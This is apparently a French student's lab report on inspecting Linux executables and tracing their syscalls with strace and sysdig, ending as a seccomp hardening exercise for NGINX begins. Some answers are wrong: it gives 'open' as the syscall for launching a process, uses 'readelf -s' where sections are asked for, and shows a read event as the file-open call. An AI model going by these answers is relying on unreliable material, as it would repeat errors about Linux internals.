# Part I : Learn

Dans cette partie, je vous fais (re)d√©couvrir quelques commandes usuelles quand on travaille autour des programmes et des processus.

**Au menu : on diss√®que des programmes, et on rep√®re les syscalls qu'ils utilisent.**

## Sommaire

## 1. Anatomy of a program

**Un programme est un fichier *ex√©cutable*. C'est √† dire que :**

- c'est un simple fichier
- il est compos√© de plusieurs sections
  - la section `.text` contient les instructions du programme pour le CPU
  - les autres sections contiennent essentiellement des metadonn√©es
- il peut √™tre compil√©...
  - statiquement : tout est dans le programme
  - dynamiquement : le programme pourra faire appel √† des librairies du syst√®me
- il est marqu√© comme √©tant "ex√©cutable"
  - sur Linux, on donne la permission d'ex√©cution avec `chmod`

Dans cette partie, on va voir quelques outils tr√®s usuels pour obtenir des infos sur un programme.

### A. `file`

`file` est une commande uqi permet de d√©terminer le type d'un fichier.

Ceci ne repose pas du tout sur l'extension du fichier. `file` regarde directement les bits qui composent le fichier pour en d√©terminer le type. Il se concentre sur les premiers octets du fichiers qui contient g√©n√©ralement des m√©tadonn√©es suffisantes pour d√©terminer le type.

üåû **Utiliser `file` pour d√©terminer le type de :**

- la commande `ls`

```
[rockynj@pesso ~]$ file /usr/bin/ls
/usr/bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1afdd52081d4b8b631f2986e26e69e0b275e159c, for GNU/Linux 3.2.0, stripped
```

- la commande `ip`

```
[rockynj@pesso ~]$ file /usr/sbin/ip
/usr/sbin/ip: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=77a2f5899f0529f27d87bb29c6b84c535739e1c7, for GNU/Linux 3.2.0, stripped
```

- un fichier `.mp3` que vous aurez t√©l√©charg√© sur le disque de la VM

```
[rockynj@pesso ~]$ file Enregistrement.mp3 
Enregistrement.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 48 kHz, JntStereo
```

> Le format des ex√©cutables sous les OS Linux est appel√© ELF. ELF est le format qui d√©finit l'ordre des octets dans un programme, le fait qu'il doit √™tre compos√© de plusieurs sections, comment il doit indiquer les librairies externes dont il a besoin, etc.

### B. `readelf`

`readelf` permet d'obtenir des informations sur un fichier ELF : un ex√©cutable Linux.

De la m√™me fa√ßon qu'un fichier texte poss√®de des num√©ros de ligne quand on l'affiche, si on affiche le contenu d'un programme, chaque ligne est num√©rot√©e.

Chaque ligne du programme a donc une adresse, qui est not√©e en hexad√©cimal.

`readelf` permet notamment de voir de quelle adresse √† quelle adresse se trouve tell ou telle section.

üåû **Utiliser `readelf` sur le programme `ls`**

- afficher le *header* du programme
  - il contient toutes les m√©tadonn√©es principales du programme
  - c'est l'option `readelf -h`

```
  [rockynj@pesso ~]$ readelf -h /usr/bin/ls
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Shared object file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x6b10
  Start of program headers:          64 (bytes into file)
  Start of section headers:          139032 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         13
  Size of section headers:           64 (bytes)
  Number of section headers:         30
  Section header string table index: 29
```

- afficher la liste des sections du programme
  - c'est l'option `readelf -S`

```
[rockynj@pesso ~]$ readelf -s /usr/bin/ls

Symbol table '.dynsym' contains 125 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __[...]@GLIBC_2.3 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND cap_to_text
     4: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.3.4 (4)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND raise@GLIBC_2.2.5 (3)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (3)
     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.34 (5)
    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND abort@GLIBC_2.2.5 (3)
    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    13: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
    14: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _exit@GLIBC_2.2.5 (3)
    17: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    18: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    19: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    20: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    22: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    23: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    24: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    25: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    26: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND c[...]@GLIBC_2.17 (6)
    27: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    28: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    29: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    30: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    31: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    32: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    33: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    34: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    35: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    36: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    37: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __[...]@GLIBC_2.4 (7)
    38: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    39: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    40: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (8)
    41: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    42: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    43: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    44: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    45: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    46: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    47: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND lseek@GLIBC_2.2.5 (3)
    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    49: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    50: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    51: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND ioctl@GLIBC_2.2.5 (3)
    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND lstat@GLIBC_2.33 (9)
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    56: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    57: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    58: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    59: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    60: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    61: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND dirfd@GLIBC_2.2.5 (3)
    62: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    63: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    64: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.3.4 (4)
    65: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    66: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    67: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.14 (10)
    68: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    69: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND tzset@GLIBC_2.2.5 (3)
    70: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    71: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    72: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    73: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    74: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    75: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    76: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    77: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    78: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    79: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    80: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    81: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    82: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    83: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    84: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.3.4 (4)
    85: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND statx@GLIBC_2.28 (11)
    86: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    87: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    88: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    89: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    90: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND error@GLIBC_2.2.5 (3)
    91: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    92: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    93: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND cap_get_file
    94: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    95: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    96: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND cap_free
    97: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    98: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
    99: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND ge[...]@GLIBC_2.3 (2)
   100: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
   101: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
   102: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5 (3)
   103: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
   104: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.3.4 (4)
   105: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
   106: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (8)
   107: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
   108: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
   109: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (8)
   110: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
   111: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
   112: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.2.5 (3)
   113: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
   114: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __[...]@GLIBC_2.3 (2)
   115: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __[...]@GLIBC_2.3 (2)
   116: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (3)
   117: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.3.4 (4)
   118: 00000000000220a0     8 OBJECT  GLOBAL DEFAULT   25 obstack_alloc_fa[...]
   119: 000000000000fe20   297 FUNC    GLOBAL DEFAULT   15 _obstack_newchunk
   120: 000000000000fe00    25 FUNC    GLOBAL DEFAULT   15 _obstack_begin_1
   121: 0000000000010840    55 FUNC    GLOBAL DEFAULT   15 _obstack_allocated_p
   122: 000000000000fde0    21 FUNC    GLOBAL DEFAULT   15 _obstack_begin
   123: 0000000000010910    38 FUNC    GLOBAL DEFAULT   15 _obstack_memory_used
   124: 0000000000010880   136 FUNC    GLOBAL DEFAULT   15 _obstack_free
```

- d√©terminer √† quel adresse commence le code du programme
  
  - pour rappel, le code est dans la section `.text`
  - vous devriez voir cette adresse dans la sortie de `readelf -S`
  
  ```
  [rockynj@pesso ~]$ readelf -S /usr/bin/ls | grep .text
  [15] .text             PROGBITS         0000000000004d50  00004d50
  ```
  

### C. `ldd`

`ldd` est un outil qui permet de manipuler le *dynamic linker* de Linux. Le *dynamic linker* c'est un programme qui s'occupe de trouver les librairies n√©cessaires quand un autre programme se lance.

**On peut utiliser `ldd` notamment pour visualiser de quelle librairie a besoin un programme donn√©.**

üåû **Utiliser `ldd` sur le programme `ls`**

- afficher la liste des librairies que va utiliser `ls` pendant son fonctionnement
  
  ```
  [rockynj@pesso ~]$ ldd /usr/bin/ls
    linux-vdso.so.1 (0x00007fff3ad8f000)
    libselinux.so.1 => /lib64/libselinux.so.1 (0x00007efff6b64000)
    libcap.so.2 => /lib64/libcap.so.2 (0x00007efff6b5a000)
    libc.so.6 => /lib64/libc.so.6 (0x00007efff6800000)
    libpcre2-8.so.0 => /lib64/libpcre2-8.so.0 (0x00007efff6abe000)
    /lib64/ld-linux-x86-64.so.2 (0x00007efff6bbb000)
  ```
  
- d√©terminer, parmi ces librairies, laquelle est la Glibc
  

```
[rockynj@pesso ~]$ ldd /usr/bin/ls | grep libc.so
    libc.so.6 => /lib64/libc.so.6 (0x00007f0438400000)
```

> La Glibc est une des librairies les plus importantes au sein d'un syst√®me Linux, car elle contient notamment tout le n√©cessaire pour passer des *syscalls* √©l√©mentaires. Si un programme souhaite lire ou √©crire dans un fichier par exemple, il aura besoin d'inclure la Glibc.

## 2. Syscalls basics

### A. Syscall list

> Vous pourrez trouver une [liste des syscalls Linux sur un syst√®me x86_64 iciiii](https://filippo.io/linux-syscall-table/).

üåû **Donner le nom ET l'identifiant unique d'un syscall qui permet √† un processus de...**

- lire un fichier stock√© sur disque
  
  ```
  0 read sys_read
  ```
  
- √©crire dans un fichier stock√© sur disque
  
  ```
  1 write sys_write
  ```
  
- lancer un nouveau processus
  
  ```
  2 open sys_open
  ```
  

> Pour la suite du TP, gardez-vous sous le coude les r√©ponses apport√©es √† cette question. Juste apr√®s vous allez regarder le langage machine contenu dans des ex√©cutables √† la recherche de l'appel √† un *syscall*. Il faudra le rep√©rer gr√¢ce √† son identifiant !

### B. `objdump`

`objdump` permet de d√©sassembler un programme, c'est √† dire d'afficher le code contenu par un ex√©cutable, sous forme de langage assembleur compr√©hensible par les humains (un peu, beaucoup plus qu'une pur√©e d'octets en tout cas !)

üåû **Utiliser `objdump`** sur la commande `ls`

- afficher le contenu de la section `.text`

```
[rockynj@pesso ~]$ objdump -M intel -j .text -d /usr/bin/ls
```

- je vous laisse trouver la commande sur l'internet :D
  
- mettez en √©vidence quelques lignes qui contiennent l'instruction `call`
  
  ```
  [rockynj@pesso ~]$ objdump -j .text -d /usr/bin/ls | grep call
  ```
  
  - il devrait y en avoir plusieurs
  - chaque `call` est un appel √† une fonction, potentiellement import√©e *via* une librairie
- mettez en √©vidence quelques lignes qui contiennent l'instruction `syscall`
  
  - il y en a aucune normalement : `ls` ne contient pas directement de syscalls
  - car il importe la Glibc, qui contient des syscalls, et les appelle avec `call`

üåû **Utiliser `objdump`** sur la librairie Glibc

- vous avez rep√©r√© son chemin exact au point d'avant avec `ldd`
  
- mettez en √©vidence quelques lignes qui contiennent l'instruction `syscall`
  
  - il devrait y en avoir pas mal
  
  ```
  [rockynj@pesso ~]$ objdump -j .text -d /lib64/libc.so.6 | grep syscall4
  ```
  
  - chaque ligne qui contient l'instruction `syscall` est la derni√®re d'un bloc de code qui est le syscall lui-m√™me
- trouvez l'instrution `syscall` qui ex√©cute le syscall `close()`
  
  ```
  127cb6:    66 2e 0f 1f 84 00 00     nopw   %cs:0x0(%rax,%rax,1)
  127cbd:    00 00 00 
  127cc0:    8b 3b                    mov    (%rbx),%edi
  127cc2:    b8 03 00 00 00           mov    $0x3,%eax
  127cc7:    0f 05                    syscall 
  ```
  
  > Pour ex√©cuter un `syscall`, le programme met dans le registre `eax` l'identifiant du syscall (avec l'instruction `mov`) puis ex√©cute l'instruction `syscall`. Vous cherchez donc une instruction `syscall` pr√©c√©d√© d'un `mov` qui met l'identifiant de `close()` dans `eax`.
  

# Part II : Observe

**Il est possible d'observer en temps r√©el ce que fait un programme. On dit qu'on peut *tracer* un programme.**

Plusieurs techniques pour faire √ßa, suivant ce qu'on veut voir ; dans ce TP on va se concentrer sur les *syscalls*.

L'outil le plus √©l√©mentaire √† conna√Ætre est `strace`. Il s'utilise en terminal et affiche tous les *syscalls* que r√©alisent un processus.

On va aussi utiliser `sysdig` plus moderne et plus puissant.

## 1. strace

Si on veut tracer un processus avec `strace`, c'est comme √ßa :

```bash
# pour tracer l'ex√©cution d'un echo par exemple
$ strace echo yo
```

üåû **Utiliser `strace` pour tracer l'ex√©cution de la commande `ls`**

- faites `ls` sur un dossier qui contient des trucs
  
  ```
  [rockynj@pesso ~]$ strace ls 
  ```
  
- mettez en √©vidence le *syscall* pour √©crire dans le terminal le r√©sultat du `ls`
  
  ```
  [rockynj@pesso ~]$ strace ls | grep write
  write(1, "Enregistrement.mp3\n", 19)    = 19
  ```
  

üåû **Utiliser `strace` pour tracer l'ex√©cution de la commande `cat`**

- faites `cat` sur un fichier qui contient des trucs

```
strace cat Enregistrement.mp3
```

- mettez en √©vidence le *syscall* qui demande l'ouverture du fichier en lecture
  
  ```
  openat(AT_FDCWD, "Enregistrement.mp3", O_RDONLY) = 3
  ```
  
- mettez en √©vidence le *syscall* qui √©crit le contenu du fichier dans le terminal
  
  ```
  write(1, "ID3\3\0\0\0\0\3%TFLT\0\0\0\17\0\0\1\377\376M\0P\0G\0/\0003"..., 52847) = 52847
  ```
  
  üåû **Utiliser `strace` pour tracer l'ex√©cution de `curl example.org`**
  
- vous devez utiliser une option de `strace`
  
- elle affiche juste un tableau qui liste tous les *syscalls* appel√©s par la commande trac√©e, et combien de fois ils ont √©t√© appel√©
  

```
[rockynj@pesso ~]$ strace -c curl example.org
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 86.68    0.000319          45         7           write
  8.70    0.000032           0        54           close
  4.62    0.000017           0       119           rt_sigaction
  0.00    0.000000           0        36           read
  0.00    0.000000           0        46           fstat
  0.00    0.000000           0        41           poll
  0.00    0.000000           0       141           mmap
  0.00    0.000000           0        35           mprotect
  0.00    0.000000           0         1           munmap
  0.00    0.000000           0         4           brk
  0.00    0.000000           0         3           rt_sigprocmask
  0.00    0.000000           0         2           ioctl
  0.00    0.000000           0         4           pread64
  0.00    0.000000           0         2         1 access
  0.00    0.000000           0         1           pipe
  0.00    0.000000           0         2           socket
  0.00    0.000000           0         1         1 connect
  0.00    0.000000           0         1           sendto
  0.00    0.000000           0         1           recvfrom
  0.00    0.000000           0         1           getsockname
  0.00    0.000000           0         1           getpeername
  0.00    0.000000           0         2           socketpair
  0.00    0.000000           0         4           setsockopt
  0.00    0.000000           0         1           getsockopt
  0.00    0.000000           0         1           execve
  0.00    0.000000           0         6           fcntl
  0.00    0.000000           0         1           sysinfo
  0.00    0.000000           0         2           statfs
  0.00    0.000000           0         2         1 arch_prctl
  0.00    0.000000           0        24           futex
  0.00    0.000000           0         2           getdents64
  0.00    0.000000           0         1           set_tid_address
  0.00    0.000000           0        60        14 openat
  0.00    0.000000           0         2           newfstatat
  0.00    0.000000           0         1           set_robust_list
  0.00    0.000000           0         1           prlimit64
  0.00    0.000000           0         1           getrandom
  0.00    0.000000           0         1           rseq
  0.00    0.000000           0         1           clone3
------ ----------- ----------- --------- --------- ----------------
100.00    0.000368           0       616        17 total
```

## 2. sysdig

### A. Intro

`sysdig` est un outil qui permet de faire pleiiin de trucs, et notamment tracer les *syscalls* que le kernel re√ßoit.

Si on le lance sans pr√©ciser, il affichera TOUS les *syscalls* que re√ßoit votre kernel.

On peut ajouter des filtres, pour ne voir que les *syscalls* qui nous int√©ressent.

Par exemple :

```bash
# si on veut tracer les *syscalls*  effectu√©s par le programme echo
sysdig proc.name=echo
```

> Il existe des tonnes et des tonnes de champs utilisables pour les filtres, on peut consulter la liste avec `sysdig -l`.

Ensuite on le laisse tourner, et si un *syscall* est appel√© et que √ßa matche notre filtre, il s'affichera !

Pour installer sysdig, utilisez les commandes suivantes (instructions pour Rocky Linux 9) :

```bash
# mettons compl√®tement √† jour l'OS d'abord si n√©cessaire
sudo dnf update -y 

# installer sysdig et ses d√©pendances
sudo dnf install -y epel-release
sudo dnf install -y dkms gcc kernel-devel make perl kernel-headers

# red√©marrer pour charger la nouvelle version du kernel si besoin (c'est automatique, juste lance un reboot)
sudo reboot

curl -SLO https://github.com/draios/sysdig/releases/download/0.39.0/sysdig-0.39.0-x86_64.rpm
sudo rpm -ivh sysdig-0.39.0-x86_64.rpm
```

### B. Use it

üåû **Utiliser `sysdig` pour tracer les *syscalls* effectu√©s par `ls`**

- faites `ls` sur un dossier qui contient des trucs (pas un dossier vide)
- mettez en √©vidence le *syscall* pour √©crire dans le terminal le r√©sultat du `ls`

```
1560 15:44:43.265990977 0 ls (4876.4876) < write res=116 data= capture.scap   .[0m.[01;36mEnregistrement.mp3.[0m   ls.scap  'proc.name=ls'
```

> Vous pouvez isoler √† la main les lignes int√©ressantes : copier/coller de la commande, et des seule(s) ligne(s) que je vous demande de rep√©rer.

üåû **Utiliser `sysdig` pour tracer les *syscalls* effectu√©s par `cat`**

- faites `cat` sur un fichier qui contient des trucs
- mettez en √©vidence le *syscall* qui demande l'ouverture du fichier en

```
4854 16:22:21.345287798 0 cat (1384) > read fd=3(<f>/home/rockynj/Enregistrement.mp3) size=131072
```

- mettez en √©vidence le *syscall* qui √©crit le contenu du fichier dans le terminal

```
3184 16:23:13.456206097 0 cat (1389) > write fd=1(<f>/dev/tty1) size=52847
```

üåû **Utiliser `sysdig` pour tracer les *syscalls* effectu√©s par votre utilisateur**

- √ßa va bourriner sec, vu que vous √™tes connect√©s en SSH √©tou
  
- juste pour vous √©duquer un peu + √† ce que fait le kernel √† chaque seconde qui passe
  
- donner la commande pour √ßa, pas besoin de me mettre le r√©sultat :d
  
  ```
  [rockynj@pesso ~]$ sudo sysdig user.name=rockynj
  ```
  

üåû **Livrez le fichier `curl.scap` dans le d√©p√¥t git de rendu**

- `sysdig` permet d'enregistrer ce qu'il capture dans un fichier pour analyse ult√©rieure
- l'extension c'est `.scap` par convention
- **capturez les *syscalls* effectu√©s par un `curl example.org`**

> `sysdig` est un outil moderne qui sert de base √† toute la suite d'outils de la bo√Æte du m√™me nom. On pense par exemple √† Falco qui permet de tracer, monitorer, lever des alertes sur des *syscalls* , au sein d'un cluster Kubernetes.

## 3. Bonus : Stratoshark

Un tout nouveau tool bien styl√© : [Stratoshark](https://wiki.wireshark.org/Stratoshark). L'interface de Wireshark (et ses fonctionnalit√©s de fou) mais pour visualiser des captures de *syscalls* (et autres).

Vous prenez pas trop la t√™te avec √ßa, mais si vous voulez vous amuser avec une interface styl√©e, il est l√† !

Vous pouvez exporter une capture `sysdig` avec `sysdig -w meo.scap proc.name=echo` par exemple, et la lire dans Stratoshark.

# Part III : Service Hardening

‚ûú **OK OK OK OK BON. Vous voyez o√π on va ? Filtrage de *syscalls* !**

Gr√¢ce √† la partie pr√©c√©dente, vous avez appris √† *tracer* un programme : regarder tous les *syscalls* qu'il appelle pendant son fonctionnement.

**Si on sait quels *syscalls* appelle un programme dans son fonctionnement normal, on peut donc dire qu'il n'a pas besoin des autres ! On va voir comment emp√™cher un programme de passer certains *syscalls*.**

> Genre un appel √† `execve("/bin/bash")`, ne cherche pas plus loin, si c'est pas sp√©cifiquement pr√©vu, **c'est un hack**.

Par exemple, on rappelle qu'un appel √† un syscall est **rigoureusement n√©cessaire** si un programme veut :

- lire/√©crire dans un fichier
- ex√©cuter un nouveau programme
- utiliser le r√©seau
- changer des permissions
- et bien d'autres

**Autrement dit, surveiller les sycalls que passe un programme, c'est surveiller ce qu'il demande au syst√®me et c'est avoir une vue tr√®s fine sur des comportements potentiellements anormaux.**

‚ûú **Le m√©canisme du kernel Linux qui permet de filter les *syscalls* que fait un programme s'appelle `seccomp`.**

On utilise donc un profil `seccomp` pour filtrer ce qu'a le droit de faire un processus ou non.

Chaque processus lanc√© peut √™tre lanc√© avec une whitelist des *syscalls* qu'il a le droit d'appeler.

Tout autre appel sera bloqu√©.

‚ûú **On va utiliser le classique serveur Web NGINX dans cette partie comme exemple !**

Un bon cas d'√©cole, et loin d'√™tre inutile tellement NGINX est partout aujourd'hui :)

‚ûú Avec **systemd** (le gestionnaire de services de Linux), **il est ais√© d'appliquer un profil `seccomp` √† un service.**

En ajoutant une clause `SystemCallFilter=` √† la d√©finition du service, on peut lister les *syscalls* qu'un service aura le droit d'effectuer.

## [](#1-install-nginx)1. Install NGINX

‚ûú **Installer et d√©marrer le serveur Web NGINX sur la machine**

- le paquet s'appelle `nginx` sous Rocky
- d√©marrer le service, ouvrez le port firewall, visitez le site web
- assurez-vous que √ßa marche correctement quoi
- **puis stoppez le service**

‚ûú **Visualiser la d√©finition du service NGINX**

- chaque service Linux est d√©fini dans un fichier `.service`
